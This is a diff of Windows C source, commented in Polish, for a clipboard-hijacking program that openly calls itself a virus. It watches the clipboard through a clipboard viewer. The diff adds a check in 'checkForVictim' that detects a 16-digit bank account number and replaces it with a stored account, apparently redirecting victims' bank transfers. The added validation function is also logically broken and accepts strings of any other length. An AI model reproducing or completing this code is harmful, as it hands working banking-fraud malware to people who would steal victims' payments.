@@ -6,6 +6,7 @@ void DecodeMessage(WPARAM, LPARAM);
 
 const char szClassName[] = "WirusMonitorujacy";
 char* bankAccount;
+bool bAset;
 HWND hwndThis;
 static HWND hwndNextViewer;
 UINT messageCode;
@@ -60,6 +61,7 @@ bool init(HINSTANCE hInstance)
 	messageCode = RegisterWindowMessage((LPCSTR)"Nic podejrzanego");
 
 	bankAccount = (char*)malloc(17*sizeof(char));
+	bAset = false;
 
 	return true;
 }
@@ -71,7 +73,7 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
 		// nasza magia z u¿yciem prywatnego kodu wiadomoœci
 		DecodeMessage(wParam, lParam);
 	}
-	else switch (msg)
+	switch (msg)
 	{
 	case WM_CREATE:
 		hwndNextViewer = SetClipboardViewer(hwnd);
@@ -100,6 +102,7 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
 	return 0;
 }
 
+// Tylko przy obs³udze komunikatu!
 void MoveToCb()
 {
 	// zaalokowanie pamiêci globalnej
@@ -137,8 +140,21 @@ void checkForVictim()
 		GlobalUnlock(hProgMem);
 		CloseClipboard();
 		// hProgMem - adres tymczasowej zmiennej w schowku
-		
+
+		if (CheckIfAccountNumber((char*)hProgMem) && bAset)
+			MoveToCb();
 	}
+}
+
+bool CheckIfAccountNumber(char* str)
+{
+	if(strlen(str) == 16)
+		for (int i = 0; i < 16; i++)
+		{
+			if (str[i] < '0' || str[i] > '9')
+				return false;
+		}
+	return true;
 }
 
 void RequestAccount()
